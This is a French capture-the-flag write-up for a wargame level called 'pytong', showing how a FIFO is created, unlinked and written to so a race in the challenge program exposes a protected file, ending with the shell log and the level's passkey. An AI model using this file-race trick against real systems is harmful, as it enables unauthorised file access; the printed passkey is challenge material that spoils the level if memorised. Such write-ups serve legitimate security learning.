# 12_pytong 

## Etape à suivre
1. Premièrement, il faut créer un fichier appellé _fifo_ dans le repertoire personnel
````sh
rantoo@warchall:~$ mkfifo ~/fifo

````
* `mkfifo`: La commande pour créer un *FIFO*.
* `~/fifo`: le *FIFO* est créé dans le répertoire personnel de l'utilisateur (`~`) et est nommé `fifo`.

=> Ce *FIFO* peut ensuite être utilisé pour établir une communication bidirectionnelle entre deux processus distincts. L'un des processus peut écrire dans le *FIFO*, tandis que l'autre peut lire à partir de celui-ci.

2. Ensuite,Accéder au dossier de challenge  et exécuter les commandes `./pytong ~/fifo &`
````sh
rantoo@warchall:/home/level/12_pytong$ ./pytong ~/fifo &

````
* `./pytong`: Ceci exécute le programme pytong depuis le répertoire actuel (`./`). 
* `~/fifo` : indique probablement que le programme pytong devrait utiliser le FIFO (~/fifo) pour quelque chose, peut-être comme un canal de communication.
* `&`: Cela signifie que le processus sera exécuté en arrière-plan. Cela permet à la commande de retourner immédiatement, sans attendre que le programme `pytong` se termine.

3. On va tenter d'ouvrir le fichier cible avec ces commandes suivants `(unlink ~/fifo ; echo hi ) > ~/fifo` 

* `unlink ~/fifo`: La commande unlink est utilisée pour supprimer un lien vers un fichier. Dans ce cas, elle supprime le *FIFO* nommé qui a été créé précédemment avec `mkfifo`. Cela a pour effet de détruire le *FIFO*.

* `> ~/fifo`: Cette partie redirige la sortie de tout le groupe de commandes précédent vers le FIFO (`~/fifo`). Cela signifie que le texte _hi_ généré par la commande echo sera écrit dans le *FIFO*.

* => L'utilisation de `unlink` pouvez supprimer le *FIFO* peut entraîner des comportements inattendus si d'autres processus tentent d'accéder au *FIFO* après sa suppression.


````sh
rantoo@warchall:/home/level/12_pytong$ (unlink ~/fifo ; echo hi ) > ~/fifo
````

````sh
[1] 2978330
handraina@warchall:/home/level/12_pytong$ opening /home/user/handraina/fifo
^C
handraina@warchall:/home/level/12_pytong$ (unlink ~/fifo ; echo hi ) > ~/fifo
closed
handraina@warchall:/home/level/12_pytong$ You are l33t
<?php
return 'KnowYourFilesChiller';
?>

^C
[1]+  Done                    ./pytong ~/fifo
````
Passkey of this level is : **KnowYourFilesChiller**